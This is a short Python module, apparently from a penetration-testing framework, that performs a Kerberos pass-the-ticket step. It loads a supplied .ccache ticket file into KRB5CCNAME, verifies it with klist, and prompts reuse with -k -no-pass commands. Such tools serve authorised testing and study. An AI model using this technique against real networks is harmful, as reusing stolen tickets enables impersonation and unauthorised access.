# modules/attack/ptt.py

import os
from core.colors import blue, green, red, yellow
from core.helpers import run_command


def attack_ptt(session, *args):
    ccache_path = args[0] if args else input("[?] Path to .ccache file: ").strip()

    if not ccache_path:
        print(red("[-] No ccache path specified."))
        return

    if not os.path.exists(ccache_path):
        print(red(f"[-] File not found: {ccache_path}"))
        return

    print(blue(f"[*] Loading ticket: {ccache_path}"))
    os.environ["KRB5CCNAME"] = ccache_path
    print(green(f"[+] KRB5CCNAME set to: {ccache_path}"))

    print(blue("[*] Verifying ticket with klist..."))
    try:
        out, err = run_command("klist")
        if out.strip():
            print(green(out))
        else:
            print(yellow("[!] klist returned no output. Ticket may be invalid."))
            if err:
                print(red(err))
        print(yellow("[*] You can now run Kerberos-auth commands with -k -no-pass"))
    except Exception as e:
        print(red(f"[!] PTT failed: {e}"))
